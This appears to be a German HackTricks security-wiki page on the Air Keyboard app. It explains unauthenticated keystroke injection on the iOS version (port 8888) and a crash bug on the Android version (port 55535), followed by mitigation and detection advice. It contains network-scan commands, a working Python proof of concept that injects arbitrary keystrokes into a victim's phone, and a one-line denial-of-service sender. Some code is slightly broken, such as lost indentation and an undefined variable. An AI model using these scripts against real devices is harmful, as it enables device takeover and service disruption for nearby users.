# Air Keyboard Remote Input Injection (Unauthenticated TCP Listener)

{{#include ../../banners/hacktricks-training.md}}

## TL;DR

Die iOS-Version der kommerziellen "Air Keyboard"-Anwendung (App Store ID 6463187929) öffnet einen **Clear-Text-TCP-Dienst auf Port 8888**, der Tastatureingabeframes **ohne jegliche Authentifizierung** akzeptiert. Jedes Gerät im selben Wi-Fi-Netzwerk kann sich mit diesem Port verbinden und beliebige Tastatureingaben in das Telefon des Opfers injizieren, was zu **vollständiger Ferninteraktionsübernahme** führt.

Eine begleitende Android-Version hört auf **Port 55535**. Sie führt einen schwachen AES-ECB-Handshake durch, aber gestalteter Müll verursacht eine **nicht behandelte Ausnahme in der OpenSSL-Dekrutierungsroutine**, die den Hintergrunddienst zum Absturz bringt (**DoS**).

## 1. Service Discovery

Scannen Sie das lokale Netzwerk und suchen Sie nach den beiden festen Ports, die von den Apps verwendet werden:
```bash
# iOS (input-injection)
nmap -p 8888 --open 192.168.1.0/24

# Android (weakly-authenticated service)
nmap -p 55535 --open 192.168.1.0/24
```
Auf Android-Geräten können Sie das verantwortliche Paket lokal identifizieren:
```bash
adb shell netstat -tulpn | grep 55535     # no root required on emulator

# rooted device / Termux
netstat -tulpn | grep LISTEN
ls -l /proc/<PID>/cmdline                # map PID → package name
```
## 2. Frame-Format (iOS)

Die Binärdatei zeigt die folgende Parsing-Logik innerhalb der `handleInputFrame()`-Routine:
```
[length (2 bytes little-endian)]
[device_id (1 byte)]
[payload ASCII keystrokes]
```
Die deklarierte Länge umfasst das `device_id` Byte **aber nicht** den zweibyte Header selbst.

## 3. Exploitation PoC
```python
#!/usr/bin/env python3
"""Inject arbitrary keystrokes into Air Keyboard for iOS"""
import socket, sys

target_ip = sys.argv[1]                  # e.g. 192.168.1.50
keystrokes = b"open -a Calculator\n"     # payload visible to the user

frame  = bytes([(len(keystrokes)+1) & 0xff, (len(keystrokes)+1) >> 8])
frame += b"\x01"                         # device_id = 1 (hard-coded)
frame += keystrokes

with socket.create_connection((target_ip, 8888)) as s:
s.sendall(frame)
print("Injected", keystrokes)
```
Jeder druckbare ASCII-Zeichen (einschließlich `\n`, `\r`, Sondertasten usw.) kann gesendet werden, was dem Angreifer effektiv die gleiche Macht wie physische Benutzereingaben verleiht: Apps starten, IMs senden, Phishing-URLs besuchen usw.

## 4. Android Companion – Denial-of-Service

Der Android-Port (55535) erwartet ein 4-Zeichen-Passwort, das mit einem **fest codierten AES-128-ECB-Schlüssel** verschlüsselt ist, gefolgt von einem zufälligen Nonce. Parsing-Fehler steigen zu `AES_decrypt()` auf und werden nicht abgefangen, was den Listener-Thread beendet. Ein einzelnes fehlerhaftes Paket reicht daher aus, um legitime Benutzer bis zum Neustart des Prozesses getrennt zu halten.
```python
import socket
socket.create_connection((victim, 55535)).send(b"A"*32)  # minimal DoS
```
## 5. Ursachenanalyse

1. **Keine Herkunfts- / Integritätsprüfungen** bei eingehenden Frames (iOS).
2. **Kryptografischer Missbrauch** (statischer Schlüssel, ECB, fehlende Längenvalidierung) und **mangelhafte Ausnahmebehandlung** (Android).

## 6. Minderung & Härtungsideen

* Exponiere niemals nicht authentifizierte Dienste auf einem mobilen Endgerät.
* Leite gerätespezifische Geheimnisse während des Onboardings ab und verifiziere sie, bevor du Eingaben verarbeitest.
* Binde den Listener an `127.0.0.1` und verwende einen gegenseitig authentifizierten, verschlüsselten Transport (z.B. TLS, Noise) für die Fernsteuerung.
* Erkenne unerwartete offene Ports während mobiler Sicherheitsüberprüfungen (`netstat`, `lsof`, `frida-trace` auf `socket()` usw.).
* Als Endbenutzer: Deinstalliere Air Keyboard oder verwende es nur in vertrauenswürdigen, isolierten Wi-Fi-Netzwerken.

## Erkennungs-Checkliste (Pentester)
```bash
# Quick one-liner to locate vulnerable devices in a /24
nmap -n -p 8888,55535 --open 192.168.1.0/24 -oG - | awk '/Ports/{print $2,$3,$4}'

# Inspect running sockets on a connected Android target
adb shell "for p in $(lsof -PiTCP -sTCP:LISTEN -n -t); do echo -n \"$p → "; cat /proc/$p/cmdline; done"
```
## Referenzen

- [Remote Input Injection Vulnerability in Air Keyboard iOS App Still Unpatched](https://www.mobile-hacker.com/2025/07/17/remote-input-injection-vulnerability-in-air-keyboard-ios-app-still-unpatched/)
- [CXSecurity advisory WLB-2025060015](https://cxsecurity.com/issue/WLB-2025060015)

{{#include ../../banners/hacktricks-training.md}}
